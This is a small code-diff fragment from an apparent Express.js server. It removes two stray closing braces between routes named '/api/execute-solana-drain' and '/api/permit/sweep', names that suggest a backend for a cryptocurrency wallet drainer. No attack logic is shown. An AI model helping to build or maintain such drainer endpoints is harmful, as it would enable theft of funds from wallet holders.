@@ -1437,8 +1437,6 @@ app.post('/api/execute-solana-drain', async (req, res) => {
   }
 });
 
-  }
-});
 
 app.post('/api/permit/sweep', async (req, res) => {
   try {
